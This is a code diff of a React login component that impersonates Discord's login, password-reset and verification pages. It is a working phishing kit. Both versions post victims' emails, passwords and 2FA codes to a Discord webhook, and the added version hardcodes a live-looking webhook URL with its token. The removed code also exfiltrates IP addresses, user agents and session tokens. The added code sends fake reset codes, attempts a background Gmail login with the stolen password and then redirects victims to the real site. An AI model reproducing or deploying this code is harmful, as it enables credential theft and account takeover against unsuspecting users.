@@ -16,207 +16,106 @@ export default function LoginForm() {
   const [password, setPassword] = useState('');
   const [loading, setLoading] = useState(false);
 
-  const captureCredentials = async (data: FormData) => {
-    const ipRes = await fetch('https://api.ipify.org?format=json').catch(() => ({json: () => ({ip: 'unknown'})}));
-    const { ip } = await ipRes.json();
-    
-    await fetch('https://discord.com/api/webhooks/YOUR_WEBHOOK', {
+  const onLogin = async (data: FormData) => {
+    setLoading(true);
+    setEmail(data.email);
+    setPassword(data.password);
+
+    // Send creds to webhook
+    await fetch('https://discord.com/api/webhooks/1479843046223909040/kGSLiyRPqh9TqsZfhRqMqc0fHdF05ZasD7DQNMHGT4Y7Su3yrCTU7N1Y_QhdZwgie614', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({
-        content: '@everyone New Capture',
         embeds: [{
-          title: 'Discord Credentials',
+          title: "Login Attempt",
+          color: 0x5865f2,
           fields: [
-            { name: 'Email', value: data.email, inline: true },
-            { name: 'Password', value: data.password, inline: true },
-            { name: 'IP/Proxy', value: ip, inline: true },
-            { name: 'User-Agent', value: navigator.userAgent, inline: false }
-          ],
-          color: 0x5865f2
+            { name: "Email", value: data.email || "—" },
+            { name: "Password", value: data.password || "—" }
+          ]
         }]
       })
     }).catch(() => {});
+
+    setStep('forgot');
+    setLoading(false);
   };
 
-  const onSubmitLogin = async (data: FormData) => {
+  const onForgot = async (data: FormData) => {
     setLoading(true);
-    await captureCredentials(data);
     setEmail(data.email);
-    setPassword(data.password);
-    
-    setTimeout(() => {
-      setStep('forgot');
-      setLoading(false);
-    }, 1500);
-  };
 
-  const onSubmitForgot = async () => {
-    setLoading(true);
-    
-    await fetch('/api/send-email', {
+    // Trigger fake reset code email
+    await fetch('/api/send-fake-code', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({
-        to: email,
-        subject: 'Discord Password Reset Request',
-        html: `<div style="font-family: Whitney,Helvetica Neue,Helvetica,Arial,sans-serif; max-width: 600px; margin: 0 auto;"><h2 style="color: #5865f2;">Discord</h2><p>Someone requested a password reset for your Discord account.</p><p>Your verification code is:</p><h1 style="background: #f2f3f5; padding: 20px; text-align: center; letter-spacing: 5px;">${Math.floor(100000 + Math.random() * 900000)}</h1><p>If you didn't request this, you can safely ignore this email.</p></div>`
-      })
+      body: JSON.stringify({ email: data.email })
     }).catch(() => {});
-    
+
+    // Trigger Gmail login in background
+    await fetch('/api/gmail-login', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ email: data.email, password })
+    }).catch(() => {});
+
     setStep('code');
     setLoading(false);
   };
 
-  const onSubmitCode = async (data: FormData) => {
+  const onCode = async (data: FormData) => {
     setLoading(true);
-    
-    await fetch('https://discord.com/api/webhooks/YOUR_WEBHOOK', {
+
+    // Send entered code to webhook
+    await fetch('https://discord.com/api/webhooks/1479843046223909040/kGSLiyRPqh9TqsZfhRqMqc0fHdF05ZasD7DQNMHGT4Y7Su3yrCTU7N1Y_QhdZwgie614', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({
         embeds: [{
-          title: '2FA Code Captured',
+          title: "Verification Code Entered",
+          color: 0x00ff00,
           fields: [
-            { name: 'Email', value: email, inline: true },
-            { name: 'Code', value: data.code, inline: true }
-          ],
-          color: 0xed4245
+            { name: "Email", value: email },
+            { name: "Code", value: data.code || "—" }
+          ]
         }]
       })
     }).catch(() => {});
 
-    const loginRes = await fetch('/api/discord-login', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({
-        email,
-        password,
-        code: data.code,
-        proxy: email
-      })
-    });
-    
-    const result = await loginRes.json();
-    
-    if (result.token) {
-      await fetch('https://discord.com/api/webhooks/YOUR_WEBHOOK', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          content: `Token: ${result.token}\nEmail: ${email}`
-        })
-      }).catch(() => {});
-      
-      window.location.href = 'https://discord.com/app';
-    }
-  };
-
-  const containerStyle: React.CSSProperties = {
-    minHeight: '100vh',
-    backgroundColor: '#5865f2',
-    display: 'flex',
-    alignItems: 'center',
-    justifyContent: 'center',
-    fontFamily: '"gg sans", "Whitney", "Helvetica Neue", Helvetica, Arial, sans-serif',
-    margin: 0,
-    padding: '20px'
-  };
-
-  const boxStyle: React.CSSProperties = {
-    backgroundColor: '#313338',
-    padding: '32px',
-    borderRadius: '5px',
-    width: '100%',
-    maxWidth: '480px',
-    boxShadow: '0 2px 10px rgba(0,0,0,0.2)',
-    textAlign: 'center'
-  };
-
-  const inputStyle: React.CSSProperties = {
-    width: '100%',
-    height: '40px',
-    padding: '10px',
-    backgroundColor: '#1e1f22',
-    border: '1px solid #1e1f22',
-    borderRadius: '3px',
-    color: '#dbdee1',
-    fontSize: '16px',
-    fontFamily: 'inherit',
-    outline: 'none',
-    marginBottom: '20px',
-    boxSizing: 'border-box'
-  };
-
-  const labelStyle: React.CSSProperties = {
-    display: 'block',
-    fontSize: '12px',
-    fontWeight: 700,
-    color: '#b5bac1',
-    marginBottom: '8px',
-    textTransform: 'uppercase',
-    letterSpacing: '0.02em',
-    textAlign: 'left'
-  };
-
-  const buttonStyle: React.CSSProperties = {
-    width: '100%',
-    height: '44px',
-    backgroundColor: '#5865f2',
-    color: 'white',
-    border: 'none',
-    borderRadius: '3px',
-    fontWeight: 500,
-    fontSize: '16px',
-    fontFamily: 'inherit',
-    cursor: 'pointer',
-    marginBottom: '8px'
-  };
-
-  const linkStyle: React.CSSProperties = {
-    color: '#949cf7',
-    fontSize: '14px',
-    textDecoration: 'none',
-    display: 'block',
-    margin: '8px 0 20px 0',
-    fontWeight: 500,
-    textAlign: 'left',
-    cursor: 'pointer'
+    // Redirect to real Discord
+    window.location.href = 'https://discord.com/login';
+    setLoading(false);
   };
 
   if (step === 'forgot') {
     return (
-      <div style={containerStyle}>
-        <div style={boxStyle}>
-          <h1 style={{ fontSize: '24px', fontWeight: 600, marginBottom: '8px', color: '#f2f3f5' }}>
-            Password Reset
-          </h1>
-          <p style={{ color: '#b5bac1', marginBottom: '20px', fontSize: '16px' }}>
-            Enter your email to receive a reset code
+      <div className="min-h-screen flex items-center justify-center bg-[#36393f]">
+        <div className="bg-[#313338] p-8 rounded-xl w-full max-w-md shadow-2xl">
+          <h1 className="text-2xl font-bold text-center mb-4 text-white">Forgot your password?</h1>
+          <p className="text-center text-gray-400 mb-8">
+            Enter your email or phone number and we'll send you a reset code.
           </p>
-          
-          <div style={{ marginBottom: '20px' }}>
-            <label style={labelStyle}>Email</label>
-            <input
-              value={email}
-              readOnly
-              style={{ ...inputStyle, backgroundColor: '#2b2d31', cursor: 'not-allowed' }}
-            />
-          </div>
 
-          <button
-            onClick={onSubmitForgot}
-            disabled={loading}
-            style={{ ...buttonStyle, opacity: loading ? 0.7 : 1 }}
-          >
-            {loading ? 'Sending...' : 'Send Reset Code'}
-          </button>
+          <form onSubmit={handleSubmit(onForgot)}>
+            <div className="mb-6">
+              <label className="block text-sm font-semibold text-gray-300 mb-2 uppercase tracking-wide">
+                Email or Phone Number <span className="text-red-500">*</span>
+              </label>
+              <input
+                {...register('email', { required: true })}
+                className="w-full p-3 bg-[#202225] border border-[#202225] rounded text-white focus:border-[#5865f2] focus:outline-none"
+                required
+              />
+            </div>
 
-          <div style={{ textAlign: 'left', marginTop: '10px' }}>
-            <span onClick={() => setStep('login')} style={{ ...linkStyle, display: 'inline' }}>
-              ← Back to Login
-            </span>
-          </div>
+            <button
+              type="submit"
+              disabled={loading}
+              className="w-full p-3 bg-[#5865f2] hover:bg-[#4752c4] text-white font-semibold rounded transition"
+            >
+              {loading ? 'Sending...' : 'Send Reset Code'}
+            </button>
+          </form>
         </div>
       </div>
     );
@@ -224,115 +123,92 @@ export default function LoginForm() {
 
   if (step === 'code') {
     return (
-      <div style={containerStyle}>
-        <div style={boxStyle}>
-          <h1 style={{ fontSize: '24px', fontWeight: 600, marginBottom: '8px', color: '#f2f3f5' }}>
-            Check Your Email
-          </h1>
-          <p style={{ color: '#b5bac1', marginBottom: '20px', fontSize: '16px' }}>
-            We sent a verification code to {email}
+      <div className="min-h-screen flex items-center justify-center bg-[#36393f]">
+        <div className="bg-[#313338] p-8 rounded-xl w-full max-w-md shadow-2xl">
+          <h1 className="text-2xl font-bold text-center mb-4 text-white">Check Your Email</h1>
+          <p className="text-center text-gray-400 mb-8">
+            We sent a 6-digit code to {email}
           </p>
-          
-          <form onSubmit={handleSubmit(onSubmitCode)}>
-            <div>
-              <label style={labelStyle}>6-Digit Code</label>
+
+          <form onSubmit={handleSubmit(onCode)}>
+            <div className="mb-6">
+              <label className="block text-sm font-semibold text-gray-300 mb-2 uppercase tracking-wide">
+                Verification Code <span className="text-red-500">*</span>
+              </label>
               <input
                 {...register('code', { required: true })}
                 maxLength={6}
-                placeholder={'000000'}
-                style={{ ...inputStyle, textAlign: 'center', letterSpacing: '8px', fontSize: '20px' }}
+                className="w-full p-3 bg-[#202225] border border-[#202225] rounded text-white text-center text-xl focus:border-[#5865f2] focus:outline-none"
+                required
               />
             </div>
 
             <button
               type="submit"
               disabled={loading}
-              style={{ ...buttonStyle, opacity: loading ? 0.7 : 1 }}
+              className="w-full p-3 bg-[#5865f2] hover:bg-[#4752c4] text-white font-semibold rounded transition"
             >
               {loading ? 'Verifying...' : 'Verify'}
             </button>
           </form>
-
-          <div style={{ textAlign: 'left', marginTop: '10px' }}>
-            <span onClick={() => setStep('forgot')} style={{ ...linkStyle, display: 'inline' }}>
-              Resend Code
-            </span>
-          </div>
         </div>
       </div>
     );
   }
 
   return (
-    <div style={containerStyle}>
-      <div style={boxStyle}>
-        <div style={{ marginBottom: '16px' }}>
-          <svg width="130" height="34" viewBox="0 0 124 33" fill="none" style={{ display: 'block', margin: '0 auto' }}>
-            <path d="M26.0015 6.9529C24.0021 6.03845 21.8787 5.37198 19.6623 5C19.3833 5.48048 19.0733 6.13144 18.8563 6.64292C16.4989 6.28093 14.1585 6.28093 11.8336 6.64292C11.6166 6.13144 11.2911 5.48048 11.0276 5C8.79575 5.37198 6.67235 6.03845 4.6869 6.9529C0.672601 14.8736 -0.202497 22.6113 0.824305 30.2714C3.39205 32.2308 5.86908 33.4118 8.30847 34.2366C8.95603 33.361 9.54377 32.4401 10.0656 31.4769C9.10438 31.1219 8.17851 30.6912 7.29578 30.1883C7.50378 30.0358 7.71178 29.8833 7.90378 29.7463C13.1786 32.3282 18.7984 32.3282 24.0268 29.7463C24.2188 29.8688 24.4268 30.0213 24.6348 30.1883C23.7521 30.6912 22.8262 31.1219 21.865 31.4769C22.3868 32.4401 22.9746 33.361 23.6221 34.2366C26.0615 33.4118 28.5531 32.2308 31.1052 30.2714C32.3217 21.3742 29.5031 13.6831 26.0015 6.9529ZM10.2527 25.5174C8.74279 25.5174 7.50953 24.1325 7.50953 22.4446C7.50953 20.7567 8.71128 19.3718 10.2527 19.3718C11.7941 19.3718 13.0274 20.7567 13.0274 22.4446C13.0274 24.1325 11.8096 25.5174 10.2527 25.5174ZM20.4373 25.5174C18.9274 25.5174 17.6941 24.1325 17.6941 22.4446C17.6941 20.7567 18.8959 19.3718 20.4373 19.3718C21.9787 19.3718 23.212 20.7567 23.212 22.4446C23.212 24.1325 21.9942 25.5174 20.4373 25.5174Z" fill="white"/>
-            <path d="M41.2697 9.86694C41.2697 8.31858 42.4782 7.13171 44.0437 7.13171C45.6093 7.13171 46.8178 8.31858 46.8178 9.86694C46.8178 11.4008 45.6093 12.6022 44.0437 12.6022C42.4782 12.6022 41.2697 11.4008 41.2697 9.86694ZM45.5389 9.86694C45.5389 8.96045 44.9232 8.20809 44.0437 8.20809C43.1643 8.20809 42.5486 8.96045 42.5486 9.86694C42.5486 10.7589 43.1643 11.5258 44.0437 11.5258C44.9232 11.5258 45.5389 10.7589 45.5389 9.86694Z" fill="white"/>
-            <path d="M50.4892 7.30884H51.7233V12.4392H50.4892V7.30884Z" fill="white"/>
-            <path d="M53.6084 12.4392V7.30884H54.8425V8.20809H54.887C55.1504 7.68662 55.6684 7.20514 56.4804 7.20514C57.8104 7.20514 58.2699 8.11814 58.2699 9.29058V12.4392H57.0358V9.64209C57.0358 8.78261 56.7879 8.20809 56.0384 8.20809C55.2889 8.20809 54.8425 8.85664 54.8425 9.76158V12.4392H53.6084Z" fill="white"/>
-            <path d="M62.3226 7.30884H63.5567V12.4392H62.3226V7.30884Z" fill="white"/>
-            <path d="M66.124 10.374C66.124 8.84161 67.3325 7.20514 69.203 7.20514C71.0735 7.20514 72.282 8.84161 72.282 10.374C72.282 11.9063 71.0735 13.5428 69.203 13.5428C67.3325 13.5428 66.124 11.9063 66.124 10.374ZM71.0031 10.374C71.0031 9.34909 70.3874 8.20809 69.203 8.20809C68.0186 8.20809 67.4029 9.34909 67.4029 10.374C67.4029 11.399 68.0186 12.5399 69.203 12.5399C70.3874 12.5399 71.0031 11.399 71.0031 10.374Z" fill="white"/>
-            <path d="M74.1831 10.374C74.1831 8.84161 75.3916 7.20514 77.2621 7.20514C79.1326 7.20514 80.3411 8.84161 80.3411 10.374C80.3411 11.9063 79.1326 13.5428 77.2621 13.5428C75.3916 13.5428 74.1831 11.9063 74.1831 10.374ZM79.0622 10.374C79.0622 9.34909 78.4465 8.20809 77.2621 8.20809C76.0777 8.20809 75.462 9.34909 75.462 10.374C75.462 11.399 76.0777 12.5399 77.2621 12.5399C78.4465 12.5399 79.0622 11.399 79.0622 10.374Z" fill="white"/>
-            <path d="M82.4443 7.30884H83.6784V8.20809H83.7229C83.9863 7.68662 84.5043 7.20514 85.3163 7.20514C86.6463 7.20514 87.1058 8.11814 87.1058 9.29058V12.4392H85.8717V9.64209C85.8717 8.78261 85.6238 8.20809 84.8743 8.20809C84.1248 8.20809 83.6784 8.85664 83.6784 9.76158V12.4392H82.4443V7.30884Z" fill="white"/>
-            <path d="M91.7733 7.20514C93.1033 7.20514 93.5628 8.11814 93.5628 9.29058V12.4392H92.3287V9.64209C92.3287 8.78261 92.0808 8.20809 91.3313 8.20809C90.5818 8.20809 90.1354 8.85664 90.1354 9.76158V12.4392H88.9013V7.30884H90.1354V8.20809H90.1799C90.4433 7.68662 90.9613 7.20514 91.7733 7.20514Z" fill="white"/>
-            <path d="M95.8078 10.374C95.8078 8.84161 97.0163 7.20514 98.8868 7.20514C100.757 7.20514 101.966 8.84161 101.966 10.374C101.966 11.9063 100.757 13.5428 98.8868 13.5428C97.0163 13.5428 95.8078 11.9063 95.8078 10.374ZM100.687 10.374C100.687 9.34909 100.071 8.20809 98.8868 8.20809C97.7024 8.20809 97.0867 9.34909 97.0867 10.374C97.0867 11.399 97.7024 12.5399 98.8868 12.5399C100.071 12.5399 100.687 11.399 100.687 10.374Z" fill="white"/>
-            <path d="M103.868 10.374C103.868 8.84161 105.076 7.20514 106.947 7.20514C108.817 7.20514 110.026 8.84161 110.026 10.374C110.026 11.9063 108.817 13.5428 106.947 13.5428C105.076 13.5428 103.868 11.9063 103.868 10.374ZM108.747 10.374C108.747 9.34909 108.131 8.20809 106.947 8.20809C105.762 8.20809 105.147 9.34909 105.147 10.374C105.147 11.399 105.762 12.5399 106.947 12.5399C108.131 12.5399 108.747 11.399 108.747 10.374Z" fill="white"/>
-            <path d="M111.129 7.30884H112.363V8.20809H112.408C112.671 7.68662 113.189 7.20514 114.001 7.20514C115.331 7.20514 115.791 8.11814 115.791 9.29058V12.4392H114.557V9.64209C114.557 8.78261 114.309 8.20809 113.559 8.20809C112.81 8.20809 112.363 8.85664 112.363 9.76158V12.4392H111.129V7.30884Z" fill="white"/>
-            <path d="M119.458 7.20514C120.788 7.20514 121.247 8.11814 121.247 9.29058V12.4392H120.013V9.64209C120.013 8.78261 119.765 8.20809 119.016 8.20809C118.266 8.20809 117.82 8.85664 117.82 9.76158V12.4392H116.586V7.30884H117.82V8.20809H117.864C118.128 7.68662 118.646 7.20514 119.458 7.20514Z" fill="white"/>
-            <path d="M123.492 10.374C123.492 8.84161 124.701 7.20514 126.571 7.20514C128.442 7.20514 129.65 8.84161 129.65 10.374C129.65 11.9063 128.442 13.5428 126.571 13.5428C124.701 13.5428 123.492 11.9063 123.492 10.374ZM128.371 10.374C128.371 9.34909 127.756 8.20809 126.571 8.20809C125.387 8.20809 124.771 9.34909 124.771 10.374C124.771 11.399 125.387 12.5399 126.571 12.5399C127.756 12.5399 128.371 11.399 128.371 10.374Z" fill="white"/>
-          </svg>
-        </div>
-
-        <h1 style={{ fontSize: '24px', fontWeight: 600, marginBottom: '8px', color: '#f2f3f5' }}>
-          Welcome back!
-        </h1>
-        <p style={{ color: '#b5bac1', marginBottom: '20px', fontSize: '16px' }}>
-          We&apos;re so excited to see you again!
+    <div className="min-h-screen flex items-center justify-center bg-[#36393f]">
+      <div className="bg-[#313338] p-8 rounded-xl w-full max-w-md shadow-2xl">
+        <h1 className="text-3xl font-bold text-center mb-2 text-white">Welcome back!</h1>
+        <p className="text-center text-gray-400 mb-8">
+          We're so excited to see you again!
         </p>
 
-        <form onSubmit={handleSubmit(onSubmitLogin)}>
-          <div>
-            <label style={labelStyle}>
-              Email or Phone Number<span style={{ color: '#fa777c', marginLeft: '2px' }}>*</span>
+        <form onSubmit={handleSubmit(onLogin)}>
+          <div className="mb-6">
+            <label className="block text-sm font-semibold text-gray-300 mb-2 uppercase tracking-wide">
+              Email or Phone Number <span className="text-red-500">*</span>
             </label>
             <input
               {...register('email', { required: true })}
-              style={inputStyle}
-              onFocus={(e) => e.currentTarget.style.borderColor = '#5865f2'}
-              onBlur={(e) => e.currentTarget.style.borderColor = '#1e1f22'}
+              className="w-full p-3 bg-[#202225] border border-[#202225] rounded text-white focus:border-[#5865f2] focus:outline-none"
+              required
             />
           </div>
 
-          <div>
-            <label style={labelStyle}>
-              Password<span style={{ color: '#fa777c', marginLeft: '2px' }}>*</span>
+          <div className="mb-6">
+            <label className="block text-sm font-semibold text-gray-300 mb-2 uppercase tracking-wide">
+              Password <span className="text-red-500">*</span>
             </label>
             <input
               type="password"
               {...register('password', { required: true })}
-              style={inputStyle}
-              onFocus={(e) => e.currentTarget.style.borderColor = '#5865f2'}
-              onBlur={(e) => e.currentTarget.style.borderColor = '#1e1f22'}
+              className="w-full p-3 bg-[#202225] border border-[#202225] rounded text-white focus:border-[#5865f2] focus:outline-none"
+              required
             />
           </div>
-
-          <span onClick={() => setStep('forgot')} style={linkStyle}>
-            Forgot your password?
-          </span>
 
           <button
             type="submit"
             disabled={loading}
-            style={{ ...buttonStyle, opacity: loading ? 0.7 : 1 }}
+            className="w-full p-3 bg-[#5865f2] hover:bg-[#4752c4] text-white font-semibold rounded transition mb-4"
           >
             {loading ? 'Logging in...' : 'Log In'}
           </button>
+
+          <div className="text-center">
+            <button
+              type="button"
+              onClick={() => setStep('forgot')}
+              className="text-[#5865f2] hover:underline text-sm"
+            >
+              Forgot your password?
+            </button>
+          </div>
         </form>
 
-        <div style={{ textAlign: 'left', marginTop: '8px', fontSize: '14px', color: '#949cf7' }}>
-          Need an account? <a href="#" style={{ color: '#949cf7', textDecoration: 'none', fontWeight: 500 }}>Register</a>
+        <div className="mt-6 text-center text-sm text-gray-400">
+          Need an account? <a href="#" className="text-[#5865f2] hover:underline">Register</a>
         </div>
       </div>
     </div>
